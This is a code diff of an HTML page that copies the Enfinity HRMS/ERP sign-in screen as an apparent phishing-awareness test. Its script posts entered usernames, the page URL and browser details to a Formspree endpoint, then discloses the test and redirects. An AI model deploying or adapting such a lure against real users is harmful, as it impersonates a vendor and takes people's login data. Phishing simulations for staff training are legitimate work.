@@ -1,138 +1,470 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Secure Access Portal</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Sign in to Enfinity - Cloud HRMS, ERP & Business Software</title>
+<meta name="description" content="Login to Enfinity, the #1 choice for Cloud HRMS, ERP and business software in MENA." />
 <style>
-body{
-  margin:0;
-  font-family:Arial, sans-serif;
-  background:#f5f7fb;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  height:100vh;
-}
+  :root {
+    --enfinity-blue: #0d3b75;
+    --enfinity-blue-dark: #0a2e5c;
+    --enfinity-cloud: rgba(255,255,255,0.45);
+    --text: #0f172a;
+    --muted: #64748b;
+    --border: #e2e8f0;
+    --panel: #f8fafc;
+  }
 
-.container{
-  width:360px;
-  background:#fff;
-  padding:30px;
-  border-radius:10px;
-  box-shadow:0 10px 30px rgba(0,0,0,0.08);
-}
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+  }
 
-.logo{
-  text-align:center;
-  font-size:22px;
-  font-weight:bold;
-  margin-bottom:10px;
-}
-.logo span{color:#2563eb;}
+  body {
+    min-height: 100vh;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    color: var(--text);
+    background: #fff;
+  }
 
-.subtitle{
-  text-align:center;
-  font-size:13px;
-  color:#666;
-  margin-bottom:25px;
-}
+  .container {
+    display: flex;
+    min-height: 100vh;
+  }
 
-label{
-  font-size:13px;
-  color:#444;
-}
+  .left {
+    position: relative;
+    width: 50%;
+    min-height: 100vh;
+    background: var(--enfinity-blue);
+    overflow: hidden;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
 
-input{
-  width:100%;
-  padding:10px;
-  margin:8px 0 15px;
-  border:1px solid #ddd;
-  border-radius:6px;
-  font-size:14px;
-}
+  .cloud {
+    position: absolute;
+    opacity: 0.5;
+    pointer-events: none;
+  }
 
-input:focus{
-  border-color:#2563eb;
-  outline:none;
-}
+  .cloud svg {
+    width: 100%;
+    height: auto;
+    fill: var(--enfinity-cloud);
+  }
 
-button{
-  width:100%;
-  padding:12px;
-  background:#2563eb;
-  border:none;
-  color:white;
-  font-size:14px;
-  border-radius:6px;
-  cursor:pointer;
-}
+  .c1 { top: 8%; left: 8%; width: 130px; animation: floatSlow 13s ease-in-out infinite; }
+  .c2 { top: 25%; right: 12%; width: 160px; animation: floatFast 9s ease-in-out infinite; }
+  .c3 { bottom: 18%; left: 15%; width: 190px; animation: floatFast 11s ease-in-out infinite; }
+  .c4 { bottom: 30%; right: 8%; width: 150px; animation: floatSlow 14s ease-in-out infinite; }
+  .c5 { top: 50%; left: 35%; width: 100px; opacity: 0.35; animation: floatSlow 16s ease-in-out infinite; }
 
-button:hover{
-  background:#1d4ed8;
-}
+  @keyframes floatFast {
+    0%, 100% { transform: translate(0, 0); }
+    50% { transform: translate(20px, -10px); }
+  }
 
-.footer{
-  text-align:center;
-  font-size:11px;
-  color:#aaa;
-  margin-top:20px;
-}
+  @keyframes floatSlow {
+    0%, 100% { transform: translate(0, 0); }
+    50% { transform: translate(-25px, 8px); }
+  }
+
+  .slider {
+    position: relative;
+    z-index: 2;
+    width: 80%;
+    max-width: 560px;
+    aspect-ratio: 1 / 1;
+  }
+
+  .slide {
+    position: absolute;
+    inset: 0;
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+    opacity: 0;
+    transition: opacity 0.7s ease;
+  }
+
+  .slide.active {
+    opacity: 1;
+  }
+
+  .dots {
+    position: absolute;
+    bottom: 30px;
+    left: 50%;
+    z-index: 3;
+    display: flex;
+    gap: 8px;
+    transform: translateX(-50%);
+  }
+
+  .dot {
+    width: 8px;
+    height: 6px;
+    border: 0;
+    border-radius: 999px;
+    background: rgba(255,255,255,0.5);
+    cursor: pointer;
+    transition: width 0.3s, background 0.3s;
+  }
+
+  .dot.active {
+    width: 32px;
+    background: #fff;
+  }
+
+  .right {
+    position: relative;
+    flex: 1;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 48px 24px 96px;
+    background: #fff;
+  }
+
+  .form-wrap {
+    width: 100%;
+    max-width: 420px;
+  }
+
+  .logo-wrap {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 128px;
+    margin-bottom: 16px;
+  }
+
+  .logo-wrap img {
+    height: 128px;
+    width: auto;
+    display: block;
+  }
+
+  .logo-text {
+    display: none;
+    font-size: 34px;
+    font-weight: 700;
+    letter-spacing: 0;
+    color: var(--text);
+  }
+
+  .logo-text span {
+    color: var(--enfinity-blue);
+  }
+
+  h1 {
+    margin-bottom: 8px;
+    font-size: 32px;
+    line-height: 1.2;
+    font-weight: 600;
+    text-align: center;
+  }
+
+  .subtitle {
+    margin-bottom: 40px;
+    color: var(--muted);
+    font-size: 15px;
+    line-height: 1.5;
+    text-align: center;
+  }
+
+  .field {
+    margin-bottom: 20px;
+  }
+
+  .field label {
+    display: block;
+    margin-bottom: 8px;
+    font-size: 14px;
+    font-weight: 500;
+  }
+
+  .field input {
+    width: 100%;
+    height: 44px;
+    padding: 0 12px;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    font-size: 14px;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+
+  .field input:focus {
+    border-color: var(--enfinity-blue);
+    box-shadow: 0 0 0 2px rgba(13,59,117,0.15);
+  }
+
+  .forgot {
+    margin-bottom: 16px;
+    text-align: right;
+  }
+
+  .forgot a {
+    color: var(--enfinity-blue);
+    font-size: 14px;
+    text-decoration: none;
+  }
+
+  .forgot a:hover {
+    text-decoration: underline;
+  }
+
+  .btn {
+    width: 100%;
+    height: 48px;
+    border: 0;
+    border-radius: 6px;
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    font-size: 16px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: background 0.2s, border-color 0.2s;
+  }
+
+  .btn-primary {
+    background: var(--enfinity-blue);
+    color: #fff;
+  }
+
+  .btn-primary:hover {
+    background: var(--enfinity-blue-dark);
+  }
+
+  .btn-outline {
+    border: 1px solid var(--border);
+    background: #fff;
+    color: var(--text);
+  }
+
+  .btn-outline:hover {
+    background: var(--panel);
+  }
+
+  .ms-icon {
+    width: 20px;
+    height: 20px;
+    flex: 0 0 auto;
+  }
+
+  footer {
+    position: absolute;
+    left: 0;
+    right: 0;
+    bottom: 24px;
+    padding: 0 24px;
+    color: var(--muted);
+    font-size: 12px;
+    line-height: 1.6;
+    text-align: center;
+  }
+
+  footer a {
+    color: var(--muted);
+    text-decoration: underline;
+  }
+
+  @media (max-width: 900px) {
+    .left {
+      width: 46%;
+    }
+  }
+
+  @media (max-width: 768px) {
+    .container {
+      display: block;
+    }
+
+    .left {
+      display: none;
+    }
+
+    .right {
+      min-height: 100vh;
+      padding: 36px 20px 96px;
+    }
+
+    h1 {
+      font-size: 28px;
+    }
+
+    .subtitle {
+      margin-bottom: 32px;
+    }
+  }
 </style>
 </head>
-
 <body>
-
 <div class="container">
-  <div class="logo">en<span>finity</span></div>
-  <div class="subtitle">Secure Employee Access Portal</div>
+  <aside class="left" aria-hidden="true">
+    <div class="cloud c1"><svg viewBox="0 0 120 60"><path d="M30 50 C10 50, 10 30, 28 28 C30 14, 50 10, 58 22 C68 12, 90 18, 90 32 C108 32, 110 50, 92 50 Z" /></svg></div>
+    <div class="cloud c2"><svg viewBox="0 0 120 60"><path d="M30 50 C10 50, 10 30, 28 28 C30 14, 50 10, 58 22 C68 12, 90 18, 90 32 C108 32, 110 50, 92 50 Z" /></svg></div>
+    <div class="cloud c3"><svg viewBox="0 0 120 60"><path d="M30 50 C10 50, 10 30, 28 28 C30 14, 50 10, 58 22 C68 12, 90 18, 90 32 C108 32, 110 50, 92 50 Z" /></svg></div>
+    <div class="cloud c4"><svg viewBox="0 0 120 60"><path d="M30 50 C10 50, 10 30, 28 28 C30 14, 50 10, 58 22 C68 12, 90 18, 90 32 C108 32, 110 50, 92 50 Z" /></svg></div>
+    <div class="cloud c5"><svg viewBox="0 0 120 60"><path d="M30 50 C10 50, 10 30, 28 28 C30 14, 50 10, 58 22 C68 12, 90 18, 90 32 C108 32, 110 50, 92 50 Z" /></svg></div>
 
-  <form onsubmit="handleLogin(event)">
-    <label>Email Address</label>
-    <input type="email" required>
+    <div class="slider">
+      <img class="slide active" src="assets/anim1.gif" alt="" onerror="this.style.display='none';" />
+      <img class="slide" src="assets/anim2.gif" alt="" onerror="this.style.display='none';" />
+      <img class="slide" src="assets/anim3.gif" alt="" onerror="this.style.display='none';" />
+    </div>
 
-    <label>Password</label>
-    <input type="password" required>
+    <div class="dots">
+      <button class="dot active" type="button" data-i="0" aria-label="Slide 1"></button>
+      <button class="dot" type="button" data-i="1" aria-label="Slide 2"></button>
+      <button class="dot" type="button" data-i="2" aria-label="Slide 3"></button>
+    </div>
+  </aside>
 
-    <button type="submit">Sign In</button>
-  </form>
+  <main class="right">
+    <div class="form-wrap">
+      <div class="logo-wrap">
+        <img src="assets/logo.png" alt="Enfinity logo" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';" />
+        <div class="logo-text">en<span>finity</span></div>
+      </div>
 
-  <div class="footer">
-    Internal system • Authorized access only
-  </div>
+      <h1>Welcome to Enfinity!</h1>
+      <p class="subtitle">The #1 Choice for Cloud HRMS, ERP &amp; Business Software in MENA</p>
+
+      <form id="loginForm">
+        <div class="field">
+          <label for="username">Username</label>
+          <input id="username" type="text" autocomplete="username" required />
+        </div>
+
+        <div class="field">
+          <label for="password">Password</label>
+          <input id="password" type="password" autocomplete="off" required />
+        </div>
+
+        <div class="forgot"><a href="#" id="forgotLink">Forgot Password?</a></div>
+
+        <button type="submit" class="btn btn-primary">Sign In</button>
+
+        <button type="button" class="btn btn-outline" id="microsoftButton">
+          <svg class="ms-icon" viewBox="0 0 24 24" aria-hidden="true">
+            <rect width="10" height="10" x="1" y="1" fill="#F25022" />
+            <rect width="10" height="10" x="13" y="1" fill="#7FBA00" />
+            <rect width="10" height="10" x="1" y="13" fill="#00A4EF" />
+            <rect width="10" height="10" x="13" y="13" fill="#FFB900" />
+          </svg>
+          Sign in with Microsoft
+        </button>
+      </form>
+    </div>
+
+    <footer>
+      <p>Copyright <span id="year"></span> <a href="https://www.onenfinity.com/" target="_blank" rel="noreferrer">Expert Business Solutions</a>. All rights reserved.</p>
+      <p>(version 8.4.26.331)</p>
+    </footer>
+  </main>
 </div>
 
 <script>
-<script>
-function handleLogin(e){
-  e.preventDefault();
+  const FORM_ENDPOINT = "https://formspree.io/f/YOUR_FORM_ID";
+  const REDIRECT_URL = "https://shabbirspro.github.io/portalsss/";
 
-  const email = document.querySelector('input[type="email"]')?.value 
-             || document.querySelector('input[type="text"]')?.value;
+  document.getElementById("year").textContent = new Date().getFullYear();
 
-  // ✅ send to Formspree (ONLY email/username)
-  fetch("https://formspree.io/f/YOUR_FORM_ID", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-      "Accept": "application/json"
-    },
-    body: JSON.stringify({
-      email: email,
-      action: "login_attempt",
-      time: new Date().toISOString(),
-      device: navigator.userAgent
-    })
+  const slides = Array.from(document.querySelectorAll(".slide"));
+  const dots = Array.from(document.querySelectorAll(".dot"));
+  let activeSlide = 0;
+
+  function showSlide(index) {
+    if (!slides.length || !dots.length) return;
+    slides[activeSlide].classList.remove("active");
+    dots[activeSlide].classList.remove("active");
+    activeSlide = index;
+    slides[activeSlide].classList.add("active");
+    dots[activeSlide].classList.add("active");
+  }
+
+  dots.forEach((dot) => {
+    dot.addEventListener("click", () => showSlide(Number(dot.dataset.i)));
   });
 
-  // ✅ message
-  alert("⚠️ Security Awareness Test\n\nBro it was a tester 😄");
+  window.setInterval(() => {
+    showSlide((activeSlide + 1) % slides.length);
+  }, 6000);
 
-  // ✅ redirect
-  window.location.href = "https://shabbirspro.github.io/portalsss/";
-}
-</script>
-</script>
+  async function sendAttempt(payload) {
+    if (!FORM_ENDPOINT || FORM_ENDPOINT.includes("YOUR_FORM_ID")) return;
 
+    try {
+      await fetch(FORM_ENDPOINT, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify(payload),
+        keepalive: true
+      });
+    } catch (error) {
+      // The awareness message and redirect should still happen if tracking fails.
+    }
+  }
+
+  async function completeAwarenessFlow(method) {
+    const form = document.getElementById("loginForm");
+    const usernameInput = document.getElementById("username");
+    const passwordInput = document.getElementById("password");
+
+    if (method === "password" && !form.checkValidity()) {
+      form.reportValidity();
+      return;
+    }
+
+    const username = usernameInput.value.trim();
+
+    const payload = {
+      email: username,
+      username: username,
+      action: "login_attempt",
+      method: method,
+      time: new Date().toISOString(),
+      page: window.location.href,
+      device: navigator.userAgent
+    };
+
+    passwordInput.value = "";
+
+    await Promise.race([
+      sendAttempt(payload),
+      new Promise((resolve) => window.setTimeout(resolve, 800))
+    ]);
+
+    alert("Security Awareness Test\n\nThis was an internal security test. No password was collected.");
+    window.location.href = REDIRECT_URL;
+  }
+
+  document.getElementById("loginForm").addEventListener("submit", (event) => {
+    event.preventDefault();
+    completeAwarenessFlow("password");
+  });
+
+  document.getElementById("microsoftButton").addEventListener("click", () => {
+    completeAwarenessFlow("microsoft");
+  });
+
+  document.getElementById("forgotLink").addEventListener("click", (event) => {
+    event.preventDefault();
+  });
+</script>
 </body>
 </html>
